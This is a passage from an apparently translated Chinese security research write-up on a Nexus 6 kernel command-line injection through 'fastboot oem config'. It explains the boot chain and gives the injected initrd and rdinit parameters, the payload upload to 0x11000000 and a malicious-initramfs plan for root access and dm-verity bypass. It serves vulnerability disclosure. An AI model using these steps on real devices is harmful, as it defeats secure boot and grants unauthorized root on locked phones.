+(bootloader)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Carrier&nbsp;IDs,&nbsp;see&nbsp;http://goo.gl/lojLh3
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;/description&gt;
+(bootloader)&nbsp;&lt;/UTAG&gt;
+[...]</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">结果正如我们所料：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">shamu:/&nbsp;$&nbsp;getprop&nbsp;ro.boot.mode
+bp-tools
+shamu:/&nbsp;$</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">需要注意的是，我们必须更改console参数，这样才能击败真正的androidboot.mode参数（该参数由bootloader插入，负责处理init进程的内核命令行的代码位于“core/init/init.cpp!import_kernel_nv“中）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">四、一个全新的攻击面</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在整个操作系统中，有多个实体使用了内核命令行，包括：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1、内核代码中的__setup宏。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2、内核代码中的early_param宏。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3、内核模块代码中的module_param宏。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">4、内核模块代码中的core_param宏。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">5、用户空间中的某些实体（比如init，如上文所述）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这些宏即使没有被引用过上百次，也被使用过很多次，我们可以控制这些宏，对任何包含这些宏的系统功能造成影响。接下来，让我们看看如何通过控制单个变量，击败设备的安全启动模式。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">五、Nexus6的安全启动模式</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">高通MSM设备（比如摩托罗拉Nexus 6）的启动过程如下所示（当然经过了相当多的精简）：</span></p><p style="text-align:center"><img src="http://p9.qhimg.com/t0170f7ad6f8f6f80a3.png" title="t01c665f18eedee56ca.png" alt="http://p2.qhimg.com/t01c665f18eedee56ca.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">设备通电后，ROM中的PBL就会开始工作，然后它会将经过数字签名的SBL加载到内存中，并验证SBL的真实性。SBL会加载经过数字签名的ABOOT（ABOOT实现了fastboot接口），并也会验证ABOOT的真实性。SBL和ABOOT的签名证书以存储在硬件中的根证书为基础。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">ABOOT随后会验证boot或者recovery镜像的真实性，从boot或recovery镜像的固定的物理地址（该地址在Nexus 6中为0x8000以及0x2000000）中加载Linux内核以及initramfs。initramfs是一个cpio格式（即经过gzip压缩）的归档文件，会在Linux内核初始化过程中被加载到rootfs中（rootfs是挂载到/目录的RAM文件系统）。initramfs包含init程序，该程序是用户空间的第一个进程。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">bootloader（ABOOT）为Linux内核准备内核命令以及initramfs参数，Linux内核位于设备树二进制大对象（Device Tree Blob，DTB）中，其物理地址为0x1e00000。我们可以将内存中的DTB导出到硬盘中，使用fdtdump解析这块数据以验证这一点：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:php;toolbar:false">[...]
+linux,initrd-end&nbsp;=&nbsp;&lt;0x02172814&gt;;
+linux,initrd-start&nbsp;=&nbsp;&lt;0x02000000&gt;;
+bootargs&nbsp;=&nbsp;&quot;console=ttyHSL0,115200,n8&nbsp;earlyprintk&nbsp;androidboot.console=ttyHSL0&nbsp;androidboot.hardware=shamu&nbsp;msm_rtb.filter=0x37&nbsp;ehci-hcd.park=3&nbsp;
+utags.blkdev=/dev/block/platform/msm_sdcc.1/by-name/utags&nbsp;utags.backup=/dev/block/platform/msm_sdcc.1/by-name/utagsBackup&nbsp;coherent_pool=8M&nbsp;
+vmalloc=300M&nbsp;buildvariant=userdebug&nbsp;androidboot.bootdevice=msm_sdcc.1&nbsp;androidboot.serialno=ZX1G427V97&nbsp;androidboot.baseband=mdm
+[...]</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">之后bootloader会将执行权交给Linux内核。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">六、Linux内核初始化：从ABOOT到init</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">Linux内核中，early_init_dt_scan_chosen函数负责解析由DTB中的ABOOT传递过来的参数。在arm内核中，该函数最终会调用如下函数：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">void&nbsp;__init&nbsp;early_init_dt_setup_initrd_arch(unsigned&nbsp;long&nbsp;start,&nbsp;unsigned&nbsp;long&nbsp;end)
+{
+phys_initrd_start&nbsp;=&nbsp;start;
+phys_initrd_size&nbsp;=&nbsp;end&nbsp;-&nbsp;start;
+}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">phys_initrd_start定位物理内存地址，这片物理内存会通过如下代码映射到虚拟地址空间中：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">void&nbsp;__init&nbsp;arm_memblock_init(struct&nbsp;meminfo&nbsp;*mi,&nbsp;struct&nbsp;machine_desc&nbsp;*mdesc)
+{
+[...]
+if&nbsp;(phys_initrd_size)&nbsp;{
+memblock_reserve(phys_initrd_start,&nbsp;phys_initrd_size);
+/*&nbsp;Now&nbsp;convert&nbsp;initrd&nbsp;to&nbsp;virtual&nbsp;addresses&nbsp;*/
+initrd_start&nbsp;=&nbsp;__phys_to_virt(phys_initrd_start);
+initrd_end&nbsp;=&nbsp;initrd_start&nbsp;+&nbsp;phys_initrd_size;
+}
+[...]
+}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">接下来，initramfs会被解压到rootfs中：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">static&nbsp;int&nbsp;__init&nbsp;populate_initramfs(void)
+{
+[...]
+&nbsp;&nbsp;&nbsp;if&nbsp;(initrd_start)&nbsp;{
+#ifdef&nbsp;CONFIG_BLK_DEV_RAM
+int&nbsp;fd;&nbsp;&nbsp;&nbsp;&nbsp;
+err&nbsp;=&nbsp;unpack_to_initramfs((char&nbsp;*)initrd_start,
+initrd_end&nbsp;-&nbsp;initrd_start);
+if&nbsp;(!err)&nbsp;{
+free_initrd();
+goto&nbsp;done;
+}&nbsp;else&nbsp;{
+clean_initramfs();
+unpack_to_initramfs(__initramfs_start,&nbsp;__initramfs_size);
+}
+[...]
+&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;return&nbsp;0;
+}
+initramfs_initcall(populate_initramfs);</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">最后kernel_init函数会被调用，该函数会执行用户空间中的第一个进程：/init。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">static&nbsp;int&nbsp;__ref&nbsp;kernel_init(void&nbsp;*unused)
+{
+[...]
+if&nbsp;(ramdisk_execute_command)&nbsp;{
+if&nbsp;(!run_init_process(ramdisk_execute_command))
+return&nbsp;0;
+pr_err(&quot;Failed&nbsp;to&nbsp;execute&nbsp;%s\n&quot;,&nbsp;ramdisk_execute_command);
+}
+[...]
+}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">注：ramdisk_execute_command的默认值为/init。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">七、用户空间的初始化以及dm-verity</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">init负责带动整个用户空间。该程序的职责之一就是设置SELinux（负责加载策略等）。一旦策略加载完毕，init会位于kernel域中，但SELinux初始化完成后不久，该进程就会转移到init域中。请注意，对于发布版系统而言，即便内核没有使用强制（enforcing）模式下的SELinux进行加载（比如，我们可以在内核命令行中使用androidboot.selinux=permissive参数实现这一点），init还是会重新设置enforce模式：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">static&nbsp;void&nbsp;selinux_initialize(bool&nbsp;in_kernel_domain)&nbsp;{
+[...]
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(in_kernel_domain)&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;INFO(&quot;Loading&nbsp;SELinux&nbsp;policy...\n&quot;);
+[...]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bool&nbsp;kernel_enforcing&nbsp;=&nbsp;(security_getenforce()&nbsp;==&nbsp;1);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bool&nbsp;is_enforcing&nbsp;=&nbsp;selinux_is_enforcing();
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(kernel_enforcing&nbsp;!=&nbsp;is_enforcing)&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(security_setenforce(is_enforcing))&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ERROR(&quot;security_setenforce(%s)&nbsp;failed:&nbsp;%s\n&quot;,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;is_enforcing&nbsp;?&nbsp;&quot;true&quot;&nbsp;:&nbsp;&quot;false&quot;,&nbsp;strerror(errno));
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;security_failure();
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+[...]
+&nbsp;&nbsp;&nbsp;&nbsp;}
+}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">注：发布版系统中，selinux_is_enforce()始终返回true。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">init也会触发分区挂载动作。dm-verity稍后会使用存放在initramfs目录（/verity_key）中的某个公钥来验证相关分区（比如system分区）的完整性，这样一来，某个不受信任的initramfs就意味着某个不受信任的system分区。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">那么，已知内核命令行存在注入漏洞，攻击者如何利用这个漏洞干扰上述的启动过程呢？</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">八、失败的尝试：控制ramdisk_execute_command</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">事实证明，有一个内核命令行参数（rdinit）会覆盖/init，也就是ramdisk_execute_command的默认值：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">static&nbsp;int&nbsp;__init&nbsp;rdinit_setup(char&nbsp;*str)
+{
+unsigned&nbsp;int&nbsp;i;
+ramdisk_execute_command&nbsp;=&nbsp;str;
+/*&nbsp;See&nbsp;&quot;auto&quot;&nbsp;comment&nbsp;in&nbsp;init_setup&nbsp;*/
+for&nbsp;(i&nbsp;=&nbsp;1;&nbsp;i&nbsp;&lt;&nbsp;MAX_INIT_ARGS;&nbsp;i++)
+argv_init[i]&nbsp;=&nbsp;NULL;
+return&nbsp;1;
+}
+__setup(&quot;rdinit=&quot;,&nbsp;rdinit_setup);</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">看起来很有希望，通过利用这个漏洞，我们可以让内核执行用户空间的任意进程，类似命令为：fastboot oem config carrier &quot;a rdinit=/sbin/foo&quot;。然而，我们无法有效控制rdinit，最主要的问题就是Nexus 6的initramfs只包含数量非常有限的几个程序：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">$&nbsp;ls&nbsp;-la&nbsp;sbin
+adbd&nbsp;&nbsp;healthd&nbsp;&nbsp;slideshow&nbsp;ueventd&nbsp;&nbsp;watchdogd</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">即便其中某个程序（比如 adbd）具备挖掘的潜力，此时用户空间仍然没有被初始化，因此这些程序可能会因为依赖条件未被满足而无法启动。前面我们分析过，漏洞的攻击面比较广，因此我们决定继续搜寻下一个可以控制的命令行参数，不去理会上述这些程序是否真的可以用于漏洞利用过程。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">九、控制initramfs的物理加载地址</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">非常有趣的是，对于arm而言，我们认识到我们有可能通过内核命令行参数initrd来控制某个物理地址，而恰好内核会从这个物理地址加载initramfs！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">arch/arm/mm/init.c中的代码如下：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">static&nbsp;int&nbsp;__init&nbsp;early_initrd(char&nbsp;*p)
+{
+unsigned&nbsp;long&nbsp;start,&nbsp;size;
+char&nbsp;*endp;
+start&nbsp;=&nbsp;memparse(p,&nbsp;&amp;endp);
+if&nbsp;(*endp&nbsp;==&nbsp;&#39;,&#39;)&nbsp;{
+size&nbsp;=&nbsp;memparse(endp&nbsp;+&nbsp;1,&nbsp;NULL);
+phys_initrd_start&nbsp;=&nbsp;start;
+phys_initrd_size&nbsp;=&nbsp;size;
+}
+return&nbsp;0;
+}
+early_param(&quot;initrd&quot;,&nbsp;early_initrd);</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这将覆盖DTB中的ABOOT所提供的默认值。我们使用一个随机值来测试，希望该值会导致内核崩溃：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">$&nbsp;fastboot&nbsp;oem&nbsp;config&nbsp;fsg-id&nbsp;&quot;a&nbsp;initrd=0x33333333,1024&quot;
+[...]
+(bootloader)&nbsp;&lt;UTAG&nbsp;name=&quot;fsg-id&quot;&nbsp;type=&quot;str&quot;&nbsp;protected=&quot;false&quot;&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;value&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;a&nbsp;initrd=0x33333333,1024
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;/value&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;description&gt;
+(bootloader)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FSG&nbsp;IDs,&nbsp;see&nbsp;http://goo.gl/gPmhU
+(bootloader)&nbsp;&nbsp;&nbsp;&lt;/description&gt;
+(bootloader)&nbsp;&lt;/UTAG&gt;
+OKAY&nbsp;[&nbsp;&nbsp;0.016s]
+finished.&nbsp;total&nbsp;time:&nbsp;0.016s
+$&nbsp;fastboot&nbsp;continue</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">内核的确崩溃了！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这类攻击的原理类似于在内存损坏漏洞中所使用的控制指令指针（IP寄存器，IP代表Instruction Point）或者程序计数器（PC寄存器，PC代表Program Counter）的原理，因此当前最紧要的第一步，就是利用fastboot，将经过我们修改的initramfs存档加载到设备内存中。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">需要注意的是，Linux内核不会重新检查initramfs的真实性，它依赖bootloader来完成这一任务，因此如果我们设法将修改过的initramfs存放到可控的phys_initrd_start物理地址上，内核的确会将其填充到rootfs中。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">十、通过USB将任意数据载入内存中</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">ABOOT的fastboot提供了一个使用USB进行下载的机制，该机制支持固件刷写（flashing）功能。在锁定的bootloader中，下载功能依然可以使用，因此攻击者可以使用这个功能将被修改过的initramfs载入设备。我们唯一的希望就是，在initramfs被填充到rootfs之前，bootloader和内核不会将这些数据填充为0或者覆盖这些数据。为了验证这一点，我们做了如下实验。首先，我们安装了自定义的msm-shamu内核，该内核具备LKM（Loadable-Kernel Modules，可加载内核模块）功能。然后，我们通过fastboot将一大段数据（0123456789ABCDEFALEFALEFALEF...）上传到设备中：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">$&nbsp;fastboot&nbsp;flash&nbsp;aleph&nbsp;payload.bin
+[...]
+target&nbsp;reported&nbsp;max&nbsp;download&nbsp;size&nbsp;of&nbsp;536870912&nbsp;bytes
+sending&nbsp;&#39;aleph&#39;&nbsp;(524288&nbsp;KB)...
+OKAY&nbsp;[&nbsp;62.610s]
+writing&nbsp;&#39;aleph&#39;...
+(bootloader)&nbsp;Not&nbsp;allowed&nbsp;in&nbsp;LOCKED&nbsp;state!
+FAILED&nbsp;(remote&nbsp;failure)
+finished.&nbsp;total&nbsp;time:&nbsp;62.630s</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">请注意，出现错误信息是因为我们试图刷写固件，然而设备的确下载了这些数据。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们通过fastboot continue启动了平台，然后使用</span><a href="https://github.com/504ensicsLabs/LiME" target="_self" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: underline;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">LiME LKM</span></a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">工具将整个物理内存导出，从中搜寻我们上传的数据。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">10FFFFC0&nbsp;&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;&nbsp;................
+10FFFFD0&nbsp;&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;&nbsp;................
+10FFFFE0&nbsp;&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;&nbsp;................
+10FFFFF0&nbsp;&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;&nbsp;................
+11000000&nbsp;&nbsp;30&nbsp;31&nbsp;32&nbsp;33&nbsp;34&nbsp;35&nbsp;36&nbsp;37&nbsp;38&nbsp;39&nbsp;41&nbsp;42&nbsp;43&nbsp;44&nbsp;45&nbsp;46&nbsp;&nbsp;0123456789ABCDEF
+11000010&nbsp;&nbsp;41&nbsp;4C&nbsp;45&nbsp;46&nbsp;41&nbsp;4C&nbsp;45&nbsp;46&nbsp;41&nbsp;4C&nbsp;45&nbsp;46&nbsp;41&nbsp;4C&nbsp;45&nbsp;46&nbsp;&nbsp;ALEFALEFALEFALEF
+11000020&nbsp;&nbsp;41&nbsp;4C&nbsp;45&nbsp;46&nbsp;41&nbsp;4C&nbsp;45&nbsp;46&nbsp;41&nbsp;4C&nbsp;45&nbsp;46&nbsp;41&nbsp;4C&nbsp;45&nbsp;46&nbsp;&nbsp;ALEFALEFALEFALEF
+11000030&nbsp;&nbsp;41&nbsp;4C&nbsp;45&nbsp;46&nbsp;41&nbsp;4C&nbsp;45&nbsp;46&nbsp;41&nbsp;4C&nbsp;45&nbsp;46&nbsp;41&nbsp;4C&nbsp;45&nbsp;46&nbsp;&nbsp;ALEFALEFALEFALEF
+11000040&nbsp;&nbsp;41&nbsp;4C&nbsp;45&nbsp;46&nbsp;41&nbsp;4C&nbsp;45&nbsp;46&nbsp;41&nbsp;4C&nbsp;45&nbsp;46&nbsp;41&nbsp;4C&nbsp;45&nbsp;46&nbsp;&nbsp;ALEFALEFALEFALEF
+11000050&nbsp;&nbsp;41&nbsp;4C&nbsp;45&nbsp;46&nbsp;41&nbsp;4C&nbsp;45&nbsp;46&nbsp;41&nbsp;4C&nbsp;45&nbsp;46&nbsp;41&nbsp;4C&nbsp;45&nbsp;46&nbsp;&nbsp;ALEFALEFALEFALEF</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">因此我们知道，即使平台已经加载并运行起来，我们的载荷也能存活下来。我们多次重复了这个过程，没有任何差错出现，载荷始终加载到0x11000000这个地址，并且Linux内核总是可以使用这个地址。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">出于好奇心，我们也使用静态分析方式验证了这个结果。事实证明，Nexus 6所使用的小型内核（Little Kernel，LK）中，SCRATCH_ADDR指向了一块内存区域，下载的数据正是保存在这片区域中。我们使用IDA加载ABOOT程序，进一步确认了这个结果（为了便于阅读，我们重命名了函数）：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">int&nbsp;fastboot_mode()
+{
+[...]
+&nbsp;&nbsp;dprintf(1,&nbsp;&quot;Entering&nbsp;fastboot&nbsp;mode\n&quot;);
+[...]
+&nbsp;&nbsp;v8&nbsp;=&nbsp;return11000000();
+&nbsp;&nbsp;v9&nbsp;=&nbsp;return20000000();
+&nbsp;&nbsp;fastboot_init(v8,&nbsp;v9);
+&nbsp;&nbsp;v11&nbsp;=&nbsp;sub_FF2EA94(v10);
+&nbsp;&nbsp;if&nbsp;(&nbsp;v13&nbsp;!=&nbsp;v10021C84&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;sub_FF3D784();
+&nbsp;&nbsp;return&nbsp;sub_FF15BA4(v11);
+}
+signed&nbsp;int&nbsp;return11000000()
+{
+&nbsp;&nbsp;signed&nbsp;int&nbsp;result;&nbsp;//&nbsp;r0@1
+&nbsp;&nbsp;result&nbsp;=&nbsp;0x11000000;
+&nbsp;&nbsp;if&nbsp;(&nbsp;v10021C84&nbsp;!=&nbsp;v10021C84&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;sub_FF3D784();
+&nbsp;&nbsp;return&nbsp;result;
+}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">该值最终被ABOOT的下载处理程序所使用。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">总而言之，内存中的initramfs存档被填充到rootfs之前，物理内存的布局如下所示：</span></p><p style="text-align:center"><img src="http://p0.qhimg.com/t018c5aceb9728808f7.png" title="t01e0e63a6fdf8c3306.png" alt="http://p2.qhimg.com/t01e0e63a6fdf8c3306.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">现在我们可以将自己的initramfs放到某个固定的物理地址上，然后指导内核填充它。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">十一、创建恶意的initramfs</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">最后一个步骤就是创建我们的恶意initramfs。我们可以编译一个userdebug AOSP启动镜像，删掉其中的initramfs.cpio.gz文件，因为这个文件包含su域以及一个root可用的adbd。只有dm-verity会发出唯一的警告，因为它无法验证官方的system分区（因为AOSP启动镜像会包含调试版的verity_key）。无论如何，既然我们现在可以加载一个恶意的initramfs，我们就可以修改fstab文件（删除验证过程），简单地绕过这个难题，或者我们可以将调试版的verity_key替换为相应的官方发行版。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">读者可以从我们的</span><a href="https://github.com/alephsecurity/research/tree/master/initroot" target="_self" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: underline;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">GitHub仓库</span></a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">中找到用于PoC演示的initramfs。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 